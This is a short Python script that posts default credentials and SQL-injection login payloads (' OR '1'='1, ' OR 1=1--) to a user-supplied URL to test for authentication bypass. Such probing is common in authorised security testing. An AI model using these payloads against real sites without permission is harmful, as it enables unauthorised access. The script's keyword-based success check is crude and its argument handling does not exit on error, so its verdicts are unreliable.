#!/usr/bin/env python3
"""
Tests for authentication bypass vulnerabilities.
"""
import requests
import sys


def test_auth_bypass(target_url):
    auth_payloads = [
        {"username": "admin", "password": "pass123"},
        {"username": "' OR '1'='1", "password": ""},
        {"token": "' OR 1=1--"},
    ]

    vulnerable = False

    print(f"Testing authentication bypass at {target_url}")

    for payload in auth_payloads:
        try:
            response = requests.post(target_url, data=payload)

            if "success" in response.text.lower() or "welcome" in response.text.lower():
                vulnerable = True

            elif len(response.history) > 0 and target_url not in [
                r.url for r in response.history
            ]:
                print(f"Redirecting payload: {payload}")

        except Exception as e:
            print(f"{payload}: Error - {e}")
    return vulnerable


def main():
    if len(sys.argv) != 2:
        print("Usage: python3 auth_test.py <target_url>")

    target = sys.argv[1]
    is_vulnerable = test_auth_bypass(target)

    if is_vulnerable:
        print("[VULNERABLE] Authentication bypass detected!")
    else:
        print("Authentication appears strong.")


if __name__ == "__main__":
    main()
